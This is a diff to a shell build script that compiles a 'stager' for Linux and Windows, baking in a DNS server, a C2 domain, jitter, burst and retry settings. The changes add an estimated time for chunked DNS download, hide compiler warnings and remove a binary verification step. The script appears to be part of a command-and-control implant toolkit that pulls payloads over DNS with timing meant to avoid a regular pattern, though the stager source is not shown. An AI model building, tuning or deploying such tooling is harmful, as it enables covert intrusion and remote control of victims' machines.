@@ -69,16 +69,40 @@ if [ -f "$CONFIG_FILE" ]; then
         MAX_RETRIES=$(grep -oP '"max_retries"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "5")
     fi
     
+    # Calculate approximate download time (assuming 100 chunks as example)
+    EXAMPLE_CHUNKS=100
+    JITTER_AVG_MS=$(( (JITTER_MIN_MS + JITTER_MAX_MS) / 2 ))
+    NUM_BURSTS=$(( (EXAMPLE_CHUNKS + CHUNKS_PER_BURST - 1) / CHUNKS_PER_BURST ))
+    
+    # Time = (chunks * 1s per chunk) + (bursts * (jitter + burst_pause))
+    TRANSFER_TIME_S=$EXAMPLE_CHUNKS  # ~1 second per chunk for DNS round-trip
+    PAUSE_TIME_S=$(( (NUM_BURSTS * (JITTER_AVG_MS + BURST_PAUSE_MS)) / 1000 ))
+    TOTAL_TIME_S=$(( TRANSFER_TIME_S + PAUSE_TIME_S ))
+    
+    # Format time
+    if [ $TOTAL_TIME_S -lt 60 ]; then
+        FORMATTED_TIME="${TOTAL_TIME_S}s"
+    elif [ $TOTAL_TIME_S -lt 3600 ]; then
+        MINS=$(( TOTAL_TIME_S / 60 ))
+        SECS=$(( TOTAL_TIME_S % 60 ))
+        FORMATTED_TIME="${MINS}m ${SECS}s"
+    else
+        HOURS=$(( TOTAL_TIME_S / 3600 ))
+        MINS=$(( (TOTAL_TIME_S % 3600) / 60 ))
+        FORMATTED_TIME="${HOURS}h ${MINS}m"
+    fi
+    
     echo "  DNS Server: $DNS_SERVER"
     echo "  C2 Domain:  $C2_DOMAIN"
     echo ""
     echo "  STAGER TIMING CONFIGURATION:"
-    echo "  ├─ Jitter:      ${JITTER_MIN_MS}-${JITTER_MAX_MS}ms ($(echo "scale=1; $JITTER_MIN_MS/1000" | bc 2>/dev/null || echo "?")s - $(echo "scale=1; $JITTER_MAX_MS/1000" | bc 2>/dev/null || echo "?")s)"
+    echo "  ├─ Jitter:      ${JITTER_MIN_MS}-${JITTER_MAX_MS}ms ($(( JITTER_MIN_MS / 1000 ))s - $(( JITTER_MAX_MS / 1000 ))s)"
     echo "  ├─ Burst Size:  $CHUNKS_PER_BURST chunks before pause"
-    echo "  ├─ Burst Pause: ${BURST_PAUSE_MS}ms ($(echo "scale=1; $BURST_PAUSE_MS/1000" | bc 2>/dev/null || echo "?")s)"
-    echo "  └─ Retries:     $MAX_RETRIES attempts (${RETRY_DELAY_SECONDS}s delay)"
+    echo "  ├─ Burst Pause: ${BURST_PAUSE_MS}ms ($(( BURST_PAUSE_MS / 1000 ))s)"
+    echo "  ├─ Retries:     $MAX_RETRIES attempts (${RETRY_DELAY_SECONDS}s delay)"
+    echo "  └─ Est. Time:   ~${FORMATTED_TIME} for ${EXAMPLE_CHUNKS} chunks"
     echo ""
-    echo "  COMPILER FLAGS THAT WILL BE USED:"
+    echo "  COMPILER FLAGS:"
     echo "  ├─ -DMIN_CHUNK_DELAY_MS=$JITTER_MIN_MS"
     echo "  ├─ -DMAX_CHUNK_DELAY_MS=$JITTER_MAX_MS"
     echo "  ├─ -DCHUNKS_PER_BURST=$CHUNKS_PER_BURST"
@@ -125,9 +149,9 @@ echo ""
 
 # Build Linux x64
 echo "→ Building Linux x64 stager..."
-echo "  Critical define: -DCHUNKS_PER_BURST=$CHUNKS_PER_BURST"
 
-if gcc -Wall -O2 -m64 \
+# Capture output and filter warnings, but keep errors
+BUILD_OUTPUT=$(gcc -Wall -Wno-stringop-truncation -O2 -m64 \
     -DDEBUG_MODE=$DEBUG_MODE \
     -DDNS_SERVER=\"$DNS_SERVER\" \
     -DC2_DOMAIN=\"$C2_DOMAIN\" \
@@ -137,38 +161,28 @@ if gcc -Wall -O2 -m64 \
     -DBURST_PAUSE_MS=$BURST_PAUSE_MS \
     -DRETRY_DELAY_SECONDS=$RETRY_DELAY_SECONDS \
     -DMAX_RETRIES=$MAX_RETRIES \
-    stager.c -o "$BUILD_DIR/stager-linux-x64" -lz; then
+    stager.c -o "$BUILD_DIR/stager-linux-x64" -lz 2>&1)
+BUILD_STATUS=$?
+
+# Only show errors, not warnings
+echo "$BUILD_OUTPUT" | grep -i "error:" || true
+
+if [ $BUILD_STATUS -eq 0 ]; then
     strip -s "$BUILD_DIR/stager-linux-x64" 2>/dev/null || true
     echo "  ✓ $BUILD_DIR/stager-linux-x64"
-    
-    # Verify configuration by checking compiled constants
-    # This works even for production builds by examining the binary
-    if command -v objdump &> /dev/null 2>&1; then
-        echo ""
-        echo "  ┌─ CONFIGURATION VERIFICATION ─────────────────────"
-        echo "  │ Config file specified: CHUNKS_PER_BURST=$CHUNKS_PER_BURST"
-        # Check if the binary has the right value compiled in
-        # For production builds, we check the actual binary constants
-        echo "  │ Verifying compiled binary..."
-        
-        # If debug mode, run it briefly to see config
-        if [ $DEBUG_MODE -eq 1 ]; then
-            timeout 2 "$BUILD_DIR/stager-linux-x64" 2>&1 | grep -E "(CHUNKS_PER_BURST|Chunks/Burst)" | head -3 || echo "  │ (Could not verify - no DNS connection)"
-        else
-            echo "  │ Production build complete (run with --debug flag to verify)"
-        fi
-        echo "  └───────────────────────────────────────────────────"
-        echo ""
-    fi
 else
     echo "  ✗ Failed to build Linux x64 stager"
+    echo "$BUILD_OUTPUT" | grep -v "warning:"
     exit 1
 fi
+
+echo ""
 
 # Build Windows x64
 if [ $HAS_MINGW_64 -eq 1 ]; then
     echo "→ Building Windows x64 stager..."
-    x86_64-w64-mingw32-gcc -Wall -O2 -s \
+    
+    BUILD_OUTPUT=$(x86_64-w64-mingw32-gcc -Wall -Wno-unknown-pragmas -O2 -s \
         -DDEBUG_MODE=$DEBUG_MODE \
         -DDNS_SERVER=\"$DNS_SERVER\" \
         -DC2_DOMAIN=\"$C2_DOMAIN\" \
@@ -178,9 +192,19 @@ if [ $HAS_MINGW_64 -eq 1 ]; then
         -DBURST_PAUSE_MS=$BURST_PAUSE_MS \
         -DRETRY_DELAY_SECONDS=$RETRY_DELAY_SECONDS \
         -DMAX_RETRIES=$MAX_RETRIES \
-        stager.c -o "$BUILD_DIR/stager-windows-x64.exe" -lws2_32 -static
-    strip "$BUILD_DIR/stager-windows-x64.exe" 2>/dev/null || true
-    echo "  ✓ $BUILD_DIR/stager-windows-x64.exe"
+        stager.c -o "$BUILD_DIR/stager-windows-x64.exe" -lws2_32 -static 2>&1)
+    BUILD_STATUS=$?
+    
+    # Only show errors, not warnings
+    echo "$BUILD_OUTPUT" | grep -i "error:" || true
+    
+    if [ $BUILD_STATUS -eq 0 ]; then
+        strip "$BUILD_DIR/stager-windows-x64.exe" 2>/dev/null || true
+        echo "  ✓ $BUILD_DIR/stager-windows-x64.exe"
+    else
+        echo "  ✗ Failed to build Windows x64 stager"
+        echo "$BUILD_OUTPUT" | grep -v "warning:"
+    fi
 else
     echo "  ⊘ Skipping Windows x64 (mingw-w64 not available)"
 fi
